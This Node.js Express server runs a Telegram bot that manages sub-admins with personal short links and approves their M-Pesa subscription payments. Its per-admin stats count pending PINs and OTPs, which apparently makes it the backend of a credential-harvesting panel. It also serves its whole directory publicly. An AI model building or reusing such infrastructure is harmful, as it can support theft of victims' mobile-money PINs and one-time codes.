const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
const { ObjectId } = require('mongodb');
require('dotenv').config();

// CRITICAL: Load database module FIRST and verify all functions exist
let db = null;
try {
    db = require('./database');
    console.log('✅ Database module loaded');
    
    // Verify critical functions exist
    const requiredFunctions = [
        'connectDatabase', 'getSubscription', 'getPendingPayments',
        'getAllAdmins', 'getAdmin', 'approvePayment', 'rejectPayment',
        'recordPaymentRequest', 'getAdminStats', 'getStats'
    ];
    
    for (const func of requiredFunctions) {
        if (typeof db[func] !== 'function') {
            throw new Error(`Missing function: db.${func}`);
        }
    }
    console.log(`✅ All ${requiredFunctions.length} required functions verified`);
} catch (error) {
    console.error('❌ FATAL: Database module failed to load:', error.message);
    process.exit(1);
}

const app = express();

const BOT_TOKEN = process.env.SUPER_ADMIN_BOT_TOKEN;
const PORT = process.env.PORT || 10000;
const WEBHOOK_URL = process.env.RENDER_EXTERNAL_URL || process.env.APP_URL;

let bot = null;
const adminChatIds = new Map();
const pausedAdmins = new Set();
const lockedAdmins = new Set();

let dbReady = false;
let botReady = false;

// ==========================================
// SETUP PHASE 1: DATABASE
// ==========================================

(async () => {
    try {
        console.log('\n🚀 STARTING SYSTEM\n');
        
        // Connect database
        console.log('1️⃣ Connecting database...');
        await db.connectDatabase();
        dbReady = true;
        console.log('   ✅ Connected\n');
        
        // Load admins
        console.log('2️⃣ Loading admins...');
        await loadAdminChatIds();
        console.log('   ✅ Loaded\n');
        
        // Setup bot
        console.log('3️⃣ Starting bot...');
        if (!BOT_TOKEN) throw new Error('BOT_TOKEN not set');
        bot = new TelegramBot(BOT_TOKEN);
        setupCommandHandlers();
        console.log('   ✅ Bot ready\n');
        
        // Setup webhook
        console.log('4️⃣ Setting webhook...');
        const fullWebhookUrl = `${WEBHOOK_URL}/telegram-webhook`;
        await setupWebhook(fullWebhookUrl);
        botReady = true;
        console.log('   ✅ Webhook ready\n');
        
        // Start server
        console.log('5️⃣ Starting server...');
        app.listen(PORT, () => {
            console.log(`   ✅ Listening on ${PORT}\n`);
            console.log('═════════════════════════════════════════');
            console.log('✅ SYSTEM FULLY INITIALIZED!');
            console.log('═════════════════════════════════════════\n');
        });
        
        // Setup maintenance
        scheduleSubscriptionCheck();
        setupHealthChecks();
        
    } catch (error) {
        console.error('\n❌ INITIALIZATION FAILED:', error.message);
        console.error(error);
        process.exit(1);
    }
})();

// ==========================================
// HELPER FUNCTIONS
// ==========================================

function getAdminIdByChatId(chatId) {
    for (const [adminId, storedChatId] of adminChatIds.entries()) {
        if (storedChatId === chatId) return adminId;
    }
    return null;
}

async function loadAdminChatIds() {
    try {
        const admins = await db.getAllAdmins();
        adminChatIds.clear();
        pausedAdmins.clear();
        lockedAdmins.clear();

        for (const admin of admins) {
            if (admin.adminId && admin.chatId) {
                adminChatIds.set(admin.adminId, admin.chatId);
                if (admin.status === 'paused') pausedAdmins.add(admin.adminId);
            }
        }

        for (const admin of admins) {
            try {
                const sub = await db.getSubscription(admin.adminId);
                if (sub?.isLocked) {
                    lockedAdmins.add(admin.adminId);
                }
            } catch (e) {
                // Silently continue
            }
        }

        console.log(`   ✅ Loaded ${adminChatIds.size} admins (${lockedAdmins.size} locked)`);
    } catch (error) {
        console.error('   ❌ Error loading admins:', error.message);
        throw error;
    }
}

async function sendToAdmin(adminId, message, options = {}) {
    if (!bot || !botReady) return null;
    
    const chatId = adminChatIds.get(adminId);
    if (!chatId) return null;
    
    try {
        return await bot.sendMessage(chatId, message, options);
    } catch (error) {
        console.error(`❌ Send to ${adminId} failed:`, error.message);
        return null;
    }
}

async function setupWebhook(fullWebhookUrl) {
    for (let attempt = 1; attempt <= 3; attempt++) {
        try {
            await bot.deleteWebHook().catch(() => {});
            await new Promise(r => setTimeout(r, 500));
            
            await bot.setWebHook(fullWebhookUrl, {
                drop_pending_updates: false,
                max_connections: 40,
                allowed_updates: ['message', 'callback_query']
            });
            
            const info = await bot.getWebHookInfo();
            if (info.url === fullWebhookUrl) {
                console.log(`   ✅ Webhook set`);
                return;
            }
        } catch (e) {
            if (attempt === 3) throw e;
            await new Promise(r => setTimeout(r, 1000));
        }
    }
}

function scheduleSubscriptionCheck() {
    setInterval(async () => {
        const today = new Date();
        if (today.getDate() === 5) {
            try {
                await db.checkAndLockOverdueSubscriptions();
                await loadAdminChatIds();
            } catch (e) {
                console.error('Subscription check failed:', e.message);
            }
        }
    }, 60 * 60 * 1000);
}

function setupHealthChecks() {
    setInterval(() => {
        console.log(`💓 [${new Date().toLocaleTimeString()}] DB:✅ Bot:${botReady ? '✅' : '❌'} Admins:${adminChatIds.size}`);
    }, 60000);
}

// ==========================================
// MIDDLEWARE
// ==========================================

app.use(express.json());
app.use(express.static(__dirname));

// ==========================================
// WEBHOOK
// ==========================================

app.post(`/telegram-webhook`, (req, res) => {
    try {
        if (req.body?.update_id !== undefined) {
            try {
                bot.processUpdate(req.body);
            } catch (e) {
                console.error('Process update error:', e.message);
            }
        }
        res.sendStatus(200);
    } catch (error) {
        console.error('Webhook error:', error.message);
        res.sendStatus(200);
    }
});

// ==========================================
// BOT COMMANDS
// ==========================================

function setupCommandHandlers() {
    if (!bot) {
        console.error('❌ Bot not initialized');
        return;
    }

    // /start
    bot.onText(/\/start/, async (msg) => {
        const chatId = msg.chat.id;
        try {
            const adminId = getAdminIdByChatId(chatId);
            if (!adminId) {
                await bot.sendMessage(chatId, '⚠️ Not registered. Contact super admin.');
                return;
            }

            const admin = await db.getAdmin(adminId);
            if (admin) {
                const appUrl = process.env.APP_URL || WEBHOOK_URL;
                const msg_text = adminId === 'ADMIN001'
                    ? `👑 *SUPER ADMIN*\n\n🔗 \`${appUrl}/${admin.shortCode}\``
                    : `✅ *ADMIN*\n\n🔗 \`${appUrl}/${admin.shortCode}\``;

                await bot.sendMessage(chatId, msg_text, {
                    parse_mode: 'Markdown',
                    reply_markup: {
                        keyboard: adminId === 'ADMIN001'
                            ? [[{ text: '/listadmins' }, { text: '/payments' }], [{ text: '/stats' }]]
                            : [[{ text: '/stats' }]]
                    }
                });
            }
        } catch (error) {
            console.error('❌ /start error:', error.message);
            try {
                await bot.sendMessage(chatId, '❌ Error: ' + error.message);
            } catch (e) {}
        }
    });

    // /listadmins - FIXED
    bot.onText(/\/listadmins/, async (msg) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);

        if (adminId !== 'ADMIN001') {
            await bot.sendMessage(chatId, '❌ Super admin only');
            return;
        }

        try {
            const admins = await db.getAllAdmins();
            if (!admins || admins.length === 0) {
                await bot.sendMessage(chatId, '📭 No admins');
                return;
            }

            let message = `📋 *ADMINS* (${admins.length})\n\n`;
            const appUrl = process.env.APP_URL || WEBHOOK_URL;

            for (let i = 0; i < Math.min(admins.length, 20); i++) {
                const admin = admins[i];
                let status = '✅';
                try {
                    const sub = await db.getSubscription(admin.adminId);
                    status = sub?.isLocked ? '🔒' : '✅';
                } catch (e) {
                    status = '⚠️';
                }

                message += `${i + 1}. ${status} *${admin.name}*\n`;
                message += `🔗 \`${appUrl}/${admin.shortCode}\`\n`;
            }

            if (admins.length > 20) {
                message += `\n... and ${admins.length - 20} more`;
            }

            await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
        } catch (error) {
            console.error('❌ /listadmins error:', error.message);
            await bot.sendMessage(chatId, `❌ ${error.message}`);
        }
    });

    // /payments - FIXED
    bot.onText(/\/payments/, async (msg) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);

        if (adminId !== 'ADMIN001') {
            await bot.sendMessage(chatId, '❌ Super admin only');
            return;
        }

        try {
            const payments = await db.getPendingPayments();
            if (!payments || payments.length === 0) {
                await bot.sendMessage(chatId, '✅ No pending');
                return;
            }

            let message = `💰 *PAYMENTS* (${payments.length})\n\n`;
            const keyboard = [];

            for (const payment of payments.slice(0, 10)) {
                try {
                    const admin = await db.getAdmin(payment.adminId);
                    const name = admin?.name || payment.adminId;
                    
                    message += `📱 *${name}*\n`;
                    message += `💵 TSh ${payment.amount}\n`;
                    message += `📋 \`${payment.mpesaReference}\`\n\n`;

                    keyboard.push([
                        { text: `✅ ${name}`, callback_data: `approve_payment_${payment._id.toString()}` },
                        { text: `❌ ${name}`, callback_data: `reject_payment_${payment._id.toString()}` }
                    ]);
                } catch (e) {
                    console.error('Payment error:', e.message);
                }
            }

            if (payments.length > 10) {
                message += `... and ${payments.length - 10} more`;
            }

            await bot.sendMessage(chatId, message, {
                parse_mode: 'Markdown',
                reply_markup: { inline_keyboard: keyboard }
            });
        } catch (error) {
            console.error('❌ /payments error:', error.message);
            await bot.sendMessage(chatId, `❌ ${error.message}`);
        }
    });

    // /stats
    bot.onText(/\/stats/, async (msg) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);

        try {
            if (adminId === 'ADMIN001') {
                const stats = await db.getStats();
                await bot.sendMessage(chatId, `📊 System\n\n👥 ${stats.totalAdmins} admins\n📋 ${stats.totalApplications} apps\n✅ ${stats.fullyApproved} approved`, { parse_mode: 'Markdown' });
            } else if (adminId) {
                const stats = await db.getAdminStats(adminId);
                await bot.sendMessage(chatId, `📊 Stats\n\n📋 ${stats.total} total\n✅ ${stats.fullyApproved} approved\n📝 ${stats.pinPending + stats.otpPending} pending`, { parse_mode: 'Markdown' });
            }
        } catch (error) {
            console.error('❌ /stats error:', error.message);
            await bot.sendMessage(chatId, '❌ Error');
        }
    });

    // /help
    bot.onText(/\/help/, async (msg) => {
        const adminId = getAdminIdByChatId(msg.chat.id);
        const text = adminId === 'ADMIN001'
            ? '/start /listadmins /payments /stats /help'
            : '/start /stats /help';
        await bot.sendMessage(msg.chat.id, text);
    });

    // Callback: Approve payment
    bot.on('callback_query', async (query) => {
        const adminId = getAdminIdByChatId(query.from.id);
        if (adminId !== 'ADMIN001') {
            await bot.answerCallbackQuery(query.id, '❌ Super admin only', true);
            return;
        }

        try {
            if (query.data.startsWith('approve_payment_')) {
                const paymentId = query.data.replace('approve_payment_', '');
                const payments = await db.getPendingPayments();
                const payment = payments.find(p => p._id.toString() === paymentId);

                if (payment) {
                    await db.approvePayment(new ObjectId(paymentId), payment.adminId);
                    lockedAdmins.delete(payment.adminId);
                    
                    await sendToAdmin(payment.adminId, '✅ *APPROVED*\n\nYour account is unlocked!', { parse_mode: 'Markdown' });
                    await bot.editMessageText('✅ Approved', {
                        chat_id: query.from.id,
                        message_id: query.message.message_id
                    });
                }
            }
            
            if (query.data.startsWith('reject_payment_')) {
                const paymentId = query.data.replace('reject_payment_', '');
                const payments = await db.getPendingPayments();
                const payment = payments.find(p => p._id.toString() === paymentId);

                if (payment) {
                    await db.rejectPayment(new ObjectId(paymentId));
                    await sendToAdmin(payment.adminId, '❌ *REJECTED*\n\nPlease resubmit', { parse_mode: 'Markdown' });
                    await bot.editMessageText('❌ Rejected', {
                        chat_id: query.from.id,
                        message_id: query.message.message_id
                    });
                }
            }
        } catch (error) {
            console.error('Callback error:', error.message);
            await bot.answerCallbackQuery(query.id, '❌ Error', true);
        }
    });

    // M-Pesa messages
    bot.on('message', async (msg) => {
        const chatId = msg.chat.id;
        const text = msg.text || '';
        const adminId = getAdminIdByChatId(chatId);

        if (text.length > 5 && adminId && adminId !== 'ADMIN001' && /^[A-Z0-9]+$/.test(text.toUpperCase())) {
            try {
                const sub = await db.getSubscription(adminId);
                if (sub?.isLocked) {
                    const reference = text.trim().toUpperCase();
                    await db.recordPaymentRequest(adminId, {
                        reference,
                        amount: 500,
                        phoneNumber: msg.from.username || msg.from.first_name || 'Unknown'
                    });

                    await bot.sendMessage(chatId, `✅ *PAYMENT RECORDED*\n\nRef: \`${reference}\``, { parse_mode: 'Markdown' });

                    const superAdminChatId = adminChatIds.get('ADMIN001');
                    if (superAdminChatId) {
                        const admin = await db.getAdmin(adminId);
                        await bot.sendMessage(superAdminChatId, `💰 New payment from ${admin?.name || adminId}`, { parse_mode: 'Markdown' });
                    }
                }
            } catch (e) {
                console.error('Payment message error:', e.message);
            }
        }
    });
}

// ==========================================
// API ENDPOINTS
// ==========================================

app.get('/health', (req, res) => {
    res.json({
        status: 'ok',
        database: dbReady ? 'connected' : 'not ready',
        bot: botReady ? 'ready' : 'not ready',
        admins: adminChatIds.size,
        timestamp: new Date().toISOString()
    });
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'invalid-link.html'));
});

app.get('/:code([a-z0-9]{3,10})', async (req, res) => {
    const code = req.params.code.toLowerCase();
    try {
        const admin = await db.getAdminByShortCode(code);
        if (!admin || admin.status !== 'active' || pausedAdmins.has(admin.adminId)) {
            return res.sendFile(path.join(__dirname, 'invalid-link.html'));
        }

        const subscription = await db.getSubscription(admin.adminId);
        if (subscription?.isLocked) {
            return res.send(`<!DOCTYPE html><html><head><title>Locked</title><style>body{font-family:sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;background:linear-gradient(135deg,#667eea,#764ba2)}.card{background:white;border-radius:24px;padding:60px 48px;text-align:center}h1{color:#111827}</style></head><body><div class="card"><h1>🔒 Akaunti Imefungwa</h1><p>Malipo ya suscription yataka kulipwa</p></div></body></html>`);
        }

        res.send(`<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Loading</title></head><body><script>sessionStorage.setItem('selectedAdminId','${admin.adminId}');sessionStorage.setItem('validLink','true');window.location.replace('/index.html');</script></body></html>`);
    } catch (error) {
        console.error('Code error:', error.message);
        res.sendFile(path.join(__dirname, 'invalid-link.html'));
    }
});

// ==========================================
// SHUTDOWN
// ==========================================

process.on('SIGTERM', async () => {
    console.log('\n🛑 Shutting down...');
    try {
        await bot?.deleteWebHook().catch(() => {});
        await db.closeDatabase();
        process.exit(0);
    } catch (e) {
        process.exit(1);
    }
});

process.on('SIGINT', async () => {
    console.log('\n🛑 Shutting down...');
    try {
        await bot?.deleteWebHook().catch(() => {});
        await db.closeDatabase();
        process.exit(0);
    } catch (e) {
        process.exit(1);
    }
});

process.on('unhandledRejection', (reason) => {
    console.error('❌ Unhandled rejection:', reason?.message || reason);
});

process.on('uncaughtException', (error) => {
    console.error('❌ Uncaught exception:', error?.message || error);
    process.exit(1);
});
